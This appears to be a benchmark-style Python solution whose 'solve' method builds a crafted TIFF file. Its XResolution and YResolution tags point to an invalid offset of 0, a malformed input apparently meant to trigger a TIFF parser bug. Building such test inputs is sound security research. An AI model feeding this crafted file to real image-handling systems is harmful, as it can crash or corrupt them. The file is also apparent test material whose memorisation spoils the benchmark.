import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        def ifd_entry(tag: int, typ: int, count: int, value_or_offset: int) -> bytes:
            return struct.pack("<HHII", tag & 0xFFFF, typ & 0xFFFF, count & 0xFFFFFFFF, value_or_offset & 0xFFFFFFFF)

        # TIFF header: little-endian, classic TIFF (42), first IFD at offset 8
        out = bytearray()
        out += b"II"
        out += struct.pack("<H", 42)
        out += struct.pack("<I", 8)

        # Build IFD with 12 entries
        entries = []

        # Baseline tags for a minimal 1x1 uncompressed grayscale image
        entries.append(ifd_entry(256, 4, 1, 1))          # ImageWidth (LONG) = 1
        entries.append(ifd_entry(257, 4, 1, 1))          # ImageLength (LONG) = 1
        entries.append(ifd_entry(258, 3, 1, 8))          # BitsPerSample (SHORT) = 8
        entries.append(ifd_entry(259, 3, 1, 1))          # Compression (SHORT) = 1 (None)
        entries.append(ifd_entry(262, 3, 1, 1))          # PhotometricInterpretation (SHORT) = 1 (BlackIsZero)
        entries.append(ifd_entry(273, 4, 1, 158))        # StripOffsets (LONG) = 158 (data after IFD)
        entries.append(ifd_entry(277, 3, 1, 1))          # SamplesPerPixel (SHORT) = 1
        entries.append(ifd_entry(278, 4, 1, 1))          # RowsPerStrip (LONG) = 1
        entries.append(ifd_entry(279, 4, 1, 4))          # StripByteCounts (LONG) = 4 bytes

        # Malicious offline tags: RATIONAL values require 8 bytes stored at an offset; offset=0 is invalid
        entries.append(ifd_entry(282, 5, 1, 0))          # XResolution (RATIONAL) offset = 0
        entries.append(ifd_entry(283, 5, 1, 0))          # YResolution (RATIONAL) offset = 0
        entries.append(ifd_entry(296, 3, 1, 2))          # ResolutionUnit (SHORT) = 2 (Inch)

        out += struct.pack("<H", len(entries))
        for e in entries:
            out += e
        out += struct.pack("<I", 0)                     # next IFD offset = 0

        # Strip data (4 bytes)
        out += b"\x00\x00\x00\x00"

        return bytes(out)